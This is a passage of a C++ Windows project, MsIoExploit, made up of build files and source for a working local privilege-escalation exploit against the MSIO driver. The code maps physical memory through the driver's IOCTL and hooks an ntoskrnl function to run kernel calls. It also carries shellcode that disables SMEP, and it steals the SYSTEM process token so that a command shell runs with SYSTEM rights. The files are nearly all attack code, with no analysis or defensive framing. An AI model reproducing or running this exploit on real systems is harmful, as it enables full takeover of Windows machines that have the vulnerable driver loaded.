      <AdditionalDependencies>libphys.lib;ntdll.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="exploit.cpp" />
    <ClCompile Include="helper.cpp" />
    <ClCompile Include="hook.cpp" />
    <ClCompile Include="impl.cpp" />
    <ClCompile Include="main.cpp" />
    <ClCompile Include="stub.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\libphys\libphys.h" />
    <ClInclude Include="exploit.hpp" />
    <ClInclude Include="helper.hpp" />
    <ClInclude Include="hook.hpp" />
    <ClInclude Include="impl.hpp" />
    <ClInclude Include="logger.hpp" />
    <ClInclude Include="nt.hpp" />
    <ClInclude Include="stub.hpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets" />
</Project>
```

`src/MsIoExploit.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="impl.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="stub.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="exploit.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="hook.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="helper.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="logger.hpp">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="impl.hpp">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="stub.hpp">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="exploit.hpp">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="hook.hpp">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\libphys\libphys.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="helper.hpp">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="nt.hpp">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`src/exploit.cpp`:

```cpp
/*

    MIT License

    Copyright (c) 2021 Kento Oki

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.

*/

#include "exploit.hpp"

exploit::exploit(std::string hook_function_name)
{
    this->hook_function_name = hook_function_name;
}

exploit::~exploit()
{
    
}

bool exploit::execute()
{
    this->hook_target = 
        reinterpret_cast<void*>(
            ntoskrnl::singleton().find_export(this->hook_function_name).as_abs());

    if (!this->hook_target)
    {
        print_bad("failed to find hook target\n");
        return false;
    }
    else
        print_good("hook target: 0x%p\n", this->hook_target);

    // prepare prologue
    memcpy(&hook_target_stub[0], this->hook_target, sizeof(hook_target_stub));

    print_info("looking for stub in entire page table...\n");

    // base address of stub should be @+[func rva]%[page size]
    const auto page_offset = 
        ntoskrnl::singleton().find_export(this->hook_function_name).as_rva() % PAGE_SIZE;
    
    // scan the entire physical memory
    bool scan_result = libphys::scan(
        reinterpret_cast<libphys::delegate::fn_callback_t>(&validation_callback),
        reinterpret_cast<libphys::delegate::fn_map_phys_t>(&map_callback),
        reinterpret_cast<libphys::delegate::fn_unmap_phys_t>(&unmap_callback),
        page_offset);

    if (!scan_result)
    {
        printf("\n");
        print_bad("not found\n");
    }

    this->ntoskrnl_image_base = helper::find_system_module_image_base("ntoskrnl.exe");

    if (!this->ntoskrnl_image_base)
    {
        print_bad("failed to locate ntoskrnl image base\n");
        return false;
    }
    else
        print_good("ntoskrnl image base: 0x%llX\n", this->ntoskrnl_image_base);

    const auto pid = this->kernel_invoke<PsGetCurrentProcessId>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("PsGetCurrentProcessId").as_rva()));

    const auto is_ok = 
        reinterpret_cast<DWORD>(pid) == GetCurrentProcessId();

    print_info("PsGetCurrentProcessId returned %d\n", pid);

    if (is_ok)
    {
        print_good("stub is ok\n");

        const auto steal_token_success = this->steal_token();

        unsigned long long cr4 = 0;
        static auto ntoskrnl_image_base = this->ntoskrnl_image_base;
        static uint16_t dos_signature = 0x0;

        this->disable_smep(&cr4);
        this->exec_in_kernel([]() -> void
            {
                dos_signature = *(uint16_t*)(ntoskrnl_image_base);
            });
        this->enable_smep(&cr4);
        
        if (dos_signature == IMAGE_DOS_SIGNATURE)
            print_good("ntoskrnl's dos signature MZ: 0x%02X\n", dos_signature);
        else
            print_bad("invalid ntoskrnl dos signature: 0x%02X\n", dos_signature);

        if (steal_token_success)
        {
            print_good("steal token successfully done\n");
            this->open_shell();
        }
        else
        {
            print_bad("failed to steal token\n");
            return false;
        }
    }
    else
    {
        print_bad("bad stub\n");
        return false;
    }

    print_info("done!\n");
    return true;
}

void exploit::open_shell()
{
    print_info("> whoami\n");
    printf("[\033[96m*\033[0m]\033[31m ");
    system("cmd.exe /c whoami");
    printf("\033[0m");
    return;
}

void exploit::kmemcpy(void* dst, void* src, size_t size)
{
    this->kernel_invoke<decltype(&memcpy)>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("memcpy").as_rva()),
        dst, src, size);
}

void exploit::disable_smep(unsigned long long* old_cr4)
{
    static uint8_t disable_smep_shellcode[] = {
        0xFA,                               // cli
        0x0F, 0x20, 0xE0,                   // mov rax, cr4
        0x48, 0x89, 0x01,                   // mov QWORD PTR [rcx], rax
        0x48, 0x25, 0xFF, 0xFF, 0xEF, 0xFF, // and rax, 0xffffffffffefffff
        0x0F, 0x22, 0xE0,                   // mov cr4, rax
        0xC3 };                             // ret

    this->execute_shellcode_in_kernel<fn_disable_smep_t>(
        reinterpret_cast<uint8_t*>(&disable_smep_shellcode),
        sizeof(disable_smep_shellcode),
        old_cr4);
}

void exploit::enable_smep(unsigned long long* old_cr4)
{
    static uint8_t enable_smep_shellcode[] = {
        0x48, 0x8B, 0x01, // mov rax, QWORD PTR [rcx]
        0x0F, 0x22, 0xE0, // mov cr4, rax
        0xFB,             // sti
        0xC3 };           // ret

    this->execute_shellcode_in_kernel<fn_enable_smep_t>(
        reinterpret_cast<uint8_t*>(&enable_smep_shellcode),
        sizeof(enable_smep_shellcode),
        old_cr4);
}

void exploit::exec_in_kernel(fn_user_function_t user_function)
{
    const auto previous_affinity = this->kernel_invoke<KeQueryActiveProcessors>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("KeQueryActiveProcessors").as_rva()));

    // Set a logical processor of execution thread so the Windows schedular
    // will not touch this thread
    this->kernel_invoke<KeSetSystemAffinityThread>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("KeSetSystemAffinityThread").as_rva()),
        static_cast<KAFFINITY>(1));

    this->kernel_invoke<fn_user_function_t>(user_function);

    this->kernel_invoke<KeSetSystemAffinityThread>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("KeSetSystemAffinityThread").as_rva()),
        previous_affinity);
}

bool exploit::steal_token()
{
    NTSTATUS nt_status = STATUS_SUCCESS;
    PEPROCESS system_process, current_process;
    PACCESS_TOKEN system_token, current_token;

    nt_status = this->kernel_invoke<PsLookupProcessByProcessId>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("PsLookupProcessByProcessId").as_rva()),
        (HANDLE)4, &system_process);

    if (!NT_SUCCESS(nt_status))
    {
        print_bad("failed to lookup system process\n");
        return false;
    }
    else
        print_good("system process @ 0x%p\n", system_process);

    nt_status = this->kernel_invoke<PsLookupProcessByProcessId>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("PsLookupProcessByProcessId").as_rva()),
        (HANDLE)GetCurrentProcessId(), &current_process);

    if (!NT_SUCCESS(nt_status))
    {
        print_bad("failed to lookup current process\n");
        return false;
    }
    else
        print_good("current process @ 0x%p\n", current_process);

    system_token = this->kernel_invoke<PsReferencePrimaryToken>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("PsReferencePrimaryToken").as_rva()),
        system_process);

    current_token = this->kernel_invoke<PsReferencePrimaryToken>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("PsReferencePrimaryToken").as_rva()),
        current_process);

    for (auto offset = 0ul; 
        offset < sizeof(void*) * 0xb0; 
        offset += sizeof(void*))
    {
        const auto addr = 
            reinterpret_cast<void*>(
                reinterpret_cast<uint64_t>(current_process) + offset);

        uint64_t value;
        this->kmemcpy(&value, addr, sizeof(uint64_t));

        const auto probable_token = 
            reinterpret_cast<PACCESS_TOKEN>(
                value & (static_cast<ULONG_PTR>(~0xf)));

        if (probable_token == current_token)
        {
            const auto system_token_addr =
                reinterpret_cast<void*>(
                    reinterpret_cast<uint64_t>(system_process) + offset);

            this->kmemcpy(addr, system_token_addr, sizeof(uint64_t));

            this->kernel_invoke<PsDereferencePrimaryToken>(
                reinterpret_cast<void*>(
                    this->ntoskrnl_image_base +
                    ntoskrnl::singleton().find_export("PsDereferencePrimaryToken").as_rva()),
                current_token);

            this->kernel_invoke<PsDereferencePrimaryToken>(
                reinterpret_cast<void*>(
                    this->ntoskrnl_image_base +
                    ntoskrnl::singleton().find_export("PsDereferencePrimaryToken").as_rva()),
                system_token);

            this->kernel_invoke<ObDereferenceObject>(
                reinterpret_cast<void*>(
                    this->ntoskrnl_image_base +
                    ntoskrnl::singleton().find_export("ObDereferenceObject").as_rva()),
                current_process);

            return true;
        }
    }

    return false;
}

```

`src/exploit.hpp`:

```hpp
/*

    MIT License

    Copyright (c) 2021 Kento Oki

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.

*/

#pragma once
#include <windows.h>
#include <functional>
#include <memory>

#include "logger.hpp"
#include "impl.hpp"
#include "stub.hpp"
#include "hook.hpp"
#include "helper.hpp"

#include "../libphys/libphys.h"

using PEPROCESS = PVOID;
using PACCESS_TOKEN = PVOID;

using PsGetCurrentProcessId = HANDLE(__fastcall*)(void);
using PsLookupProcessByProcessId = NTSTATUS(__fastcall*)(HANDLE ProcessId, PEPROCESS Process);
using PsReferencePrimaryToken = PACCESS_TOKEN(__fastcall*)(PEPROCESS Process);
using PsDereferencePrimaryToken = void(__fastcall*)(PACCESS_TOKEN PrimaryToken);
using ObDereferenceObject = void(__fastcall*)(PVOID Object);
using ExAllocatePool = PVOID(__fastcall*)(POOL_TYPE PoolType, SIZE_T NumberOfBytes);
using ExFreePool = void(__fastcall*)(PVOID p);
using KeSetSystemAffinityThread = void(__fastcall*)(KAFFINITY Affinity);
using KeQueryActiveProcessors = KAFFINITY(__fastcall*)(void);

using fn_disable_smep_t = void(__fastcall*)(unsigned long long* old_cr4);
using fn_enable_smep_t = void(__fastcall*)(unsigned long long* old_cr4);
using fn_user_function_t = void(*)();

class exploit
{
public:
    explicit exploit(std::string hook_function_name = "NtTraceControl");
    ~exploit();

    bool execute();
    void open_shell();

    // execute memcpy in the CPL0 context
    void kmemcpy(void* dst, void* src, size_t size);

    void disable_smep(unsigned long long* old_cr4);
    void enable_smep(unsigned long long* old_cr4);
    void exec_in_kernel(fn_user_function_t user_function);

    template <class FnType, class ... Args>
    std::invoke_result_t<FnType, Args ...> execute_shellcode_in_kernel(
        uint8_t* shellcode, size_t shellcode_size, Args ... augments)
    {
        constexpr auto is_ret_type_void =
            std::is_same<
                std::invoke_result_t< FnType, Args... >, void >{};

        // 1. allocate non-paged pool with rwx rights in kernel virtual memory
        const auto pool = this->kernel_invoke<ExAllocatePool>(
            reinterpret_cast<void*>(
                this->ntoskrnl_image_base +
                ntoskrnl::singleton().find_export("ExAllocatePool").as_rva()),
            NonPagedPoolExecute, sizeof(shellcode_size));

        if constexpr (is_ret_type_void)
        {
            if (!pool)
                return;
        }
        else
        {
            if (!pool)
                return {};
        }

        // 2. copy to the allocated pool
        this->kmemcpy(pool, shellcode, shellcode_size);

        if constexpr (is_ret_type_void)
        {
            this->kernel_invoke<FnType>(pool, augments ...);

            this->kernel_invoke<ExFreePool>(
                reinterpret_cast<void*>(
                    this->ntoskrnl_image_base +
                    ntoskrnl::singleton().find_export("ExFreePool").as_rva()),
                pool);
            
            return;
        }
        else
        {
            const auto invoke_result =
                this->kernel_invoke<FnType>(pool, augments ...);

            this->kernel_invoke<ExFreePool>(
                reinterpret_cast<void*>(
                    this->ntoskrnl_image_base +
                    ntoskrnl::singleton().find_export("ExFreePool").as_rva()),
                pool);

            return invoke_result;
        }
    }

    template <class FnType, class ... Args>
    std::invoke_result_t<FnType, Args ...> kernel_invoke(
        void* detour, Args ... augments)
    {
        static auto procedure =
            reinterpret_cast<void*>(
                GetProcAddress(
                    GetModuleHandle(TEXT("ntdll.dll")),
                    this->hook_function_name.c_str()));

        constexpr auto is_ret_type_void =
            std::is_same<
                std::invoke_result_t< FnType, Args... >, void >{};

        auto kernel_hook = hook_handler(this->hook_target_on_mapped_va, detour);
        kernel_hook.exec(false);

        if constexpr (is_ret_type_void)
        {
            reinterpret_cast<FnType>(procedure)(augments ...);
        }
        else
        {
            const auto invoke_result =
                reinterpret_cast<FnType>(procedure)(augments ...);

            kernel_hook.unhook();

            return invoke_result;
        }

        kernel_hook.unhook();
    }

    template<typename ... Args>
    static exploit& singleton(Args ... augments)
    {
        static exploit instance(augments ...);
        return instance;
    }

    void set_hook_base(void* pointer)
    {
        this->hook_target_on_mapped_va = pointer;
    }

    uint8_t hook_target_stub[30] = { 0 };
    uint64_t ntoskrnl_image_base;
private:
    bool steal_token();

    std::string hook_function_name;
    void* hook_target;
    void* hook_target_on_mapped_va;
};

static bool validation_callback(void* addr)
{
    const uint8_t* byte_array = reinterpret_cast<uint8_t*>(addr);

    printf("\r");
    print_info("scanning 0x%llX -> { %02X %02X %02X %02X ... }",
        addr,
        byte_array[0], byte_array[1], byte_array[2], byte_array[3]);

    if (memcmp(
        addr,
        exploit::singleton().hook_target_stub,
        sizeof(exploit::singleton().hook_target_stub)) == 0)
    {
        printf("\n");
        print_good("stub found at 0x%llX\n", addr);

        exploit::singleton().set_hook_base(addr);

        return true;
    }

    return false;
}

static void* map_callback(uint64_t phys_addr, size_t size)
{
    const auto mapped_phys = msio::map_phys(phys_addr, size);
    const auto mapped_va = mapped_phys.mapped_va;
    return reinterpret_cast<void*>(mapped_va);
}

static void unmap_callback(uint64_t phys_addr, size_t size)
{
    return msio::unmap_phys({ size, phys_addr });
}

```

`src/helper.cpp`:

```cpp
/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#include "helper.hpp"

uint64_t helper::find_system_module_image_base(std::string_view target_module_name)
{
	NTSTATUS status;
	PVOID buffer;
	ULONG alloc_size = 0x10000;
	ULONG needed_size;

	do
	{
		buffer = calloc(1, alloc_size);

		if (!buffer)
		{
			return {};
		}

		status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)11,
			buffer,
			alloc_size,
			&needed_size
		);

		if (!NT_SUCCESS(status) && status != STATUS_INFO_LENGTH_MISMATCH)
		{
			free(buffer);
			return {};
		}

		if (status == STATUS_INFO_LENGTH_MISMATCH)
		{
			free(buffer);
			buffer = NULL;
			alloc_size *= 2;
		}
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (!buffer)
	{
		return {};
	}

	PSYSTEM_MODULE_INFORMATION module_information = (PSYSTEM_MODULE_INFORMATION)buffer;

	for (ULONG i = 0; i < module_information->Count; i++)
	{
		SYSTEM_MODULE_INFORMATION_ENTRY module_entry = module_information->Modules[i];
		PCHAR module_name = module_entry.ImageName + module_entry.ModuleNameOffset;

		if (target_module_name.compare(module_name) == 0)
		{
			const auto image_base =
				reinterpret_cast<uint64_t>(module_entry.DllBase);

			free(buffer);
			return image_base;
		}
	}

	free(buffer);
	return {};
}

```

`src/helper.hpp`:

```hpp
/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#pragma once
#include <windows.h>
#include <winternl.h>

#include "logger.hpp"
#include "nt.hpp"

namespace helper
{
	uint64_t find_system_module_image_base(std::string_view target_module_name);
}
```

`src/hook.cpp`:

```cpp
/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#include "hook.hpp"

hook_handler::hook_handler(
	void* hook_func_addr, void* detour_func_addr)
{
	this->hook_func = hook_func_addr;
	this->detour_func = detour_func_addr;
	this->is_hooked = false;

	const uint8_t shell_template[12] = {
		0x48, 0xb8,                              // mov rax,
		0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,  // 0xaddress ; detour function address
		0xff, 0xe0 };                            // jmp rax   ; jmp to detour function

	// prepare shellcode blob
	memcpy(&this->shellcode, &shell_template, sizeof(shellcode));

	// set detour address on the shellcode
	memcpy(&this->shellcode[2], &detour_func_addr, sizeof(void*));

	// save original
	memcpy(&this->original, hook_func_addr, sizeof(shellcode));
}

hook_handler::~hook_handler()
{
	if (is_hooked)
		this->unhook();
}

bool hook_handler::exec(bool should_unprotect)
{
	if (is_hooked)
		return false;

	DWORD oldProtect;

	if (should_unprotect)
		if (VirtualProtect(this->hook_func, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect) == FALSE)
			return false;

	// execute inline hook a.k.a prologue hook
	memcpy(this->hook_func, &this->shellcode[0], sizeof(shellcode));

	if (should_unprotect)
		if (VirtualProtect(this->hook_func, sizeof(shellcode), oldProtect, &oldProtect) == FALSE)
			return false;

	is_hooked = true;
	return true;
}

void hook_handler::unhook()
{
	if (!is_hooked)
		return;

	memcpy(this->hook_func, &this->original[0], sizeof(shellcode));
}

```

`src/hook.hpp`:

```hpp
/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#pragma once
#include <windows.h>

#include "logger.hpp"

class hook_handler
{
public:
	explicit hook_handler(void* hook_func_addr, void* detour_func_addr);
	~hook_handler();

	bool exec(bool should_unprotect);
	void unhook();

	bool is_hooked;
private:
	void* hook_func;
	void* detour_func;

	uint8_t original[12];
	uint8_t shellcode[12];
};


```

`src/impl.cpp`:

```cpp
/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#include "impl.hpp"

bool msio::init()
{
	deviceHandle = CreateFile(
		TEXT(MSIO_DOS_DEVICE_NAME),
		GENERIC_READ | GENERIC_WRITE,
		0,
		nullptr,
		OPEN_EXISTING,
		NULL,
		NULL);

	if (!deviceHandle || deviceHandle == INVALID_HANDLE_VALUE)
	{
		print_bad("failed to open device\n");
		return false;
	}

	print_good("device opened: 0x%lX\n", deviceHandle);

	return true;
}

MSIO_MAP_PHYS_REQUEST msio::map_phys(uint64_t phys_addr, size_t size)
{
	DWORD bytesReturned = 0;

	MSIO_MAP_PHYS_REQUEST payload = { 0 };
	payload.phys_addr = phys_addr;
	payload.size = size;
	
	DeviceIoControl(
		deviceHandle, 
		IOCTL_MSIO_MAPPHYSTOLIN, 
		&payload, sizeof(MSIO_MAP_PHYS_REQUEST),
		&payload, sizeof(MSIO_MAP_PHYS_REQUEST),
		&bytesReturned,
		NULL);

	return payload;
}

void msio::unmap_phys(MSIO_MAP_PHYS_REQUEST payload)
{
	DWORD bytesReturned = 0;

	DeviceIoControl(
		deviceHandle,
		IOCTL_MSIO_MAPPHYSTOLIN,
		&payload, sizeof(MSIO_MAP_PHYS_REQUEST),
		&payload, sizeof(MSIO_MAP_PHYS_REQUEST),
		&bytesReturned,
		NULL);
}

```

`src/impl.hpp`:

```hpp
/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#pragma once
#include <windows.h>
#include <vector>

#include "logger.hpp"

#define MSIO_DOS_DEVICE_NAME "\\\\.\\MSIO"
#define IOCTL_MSIO_MAPPHYSTOLIN 0x80102040
#define IOCTL_MSIO_UNMAPPHYSADDR 0x80102044

typedef struct _MSIO_MAP_PHYS_REQUEST
{
	size_t size;           // [IN] map size
	uint64_t phys_addr;    // [IN] physical address
	uint64_t phys_handle;  // [OUT] section handle
	uint64_t mapped_va;    // [OUT] our process virtual memory
	uint64_t phys_section; // [OUT] kernel virtual address
} MSIO_MAP_PHYS_REQUEST, * PMSIO_MAP_PHYS_REQUEST;

namespace msio
{
	inline static HANDLE deviceHandle = NULL;

	bool init();
	MSIO_MAP_PHYS_REQUEST map_phys(uint64_t phys_addr, size_t size);
	void unmap_phys(MSIO_MAP_PHYS_REQUEST payload);
}
```

`src/logger.hpp`:

```hpp
/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

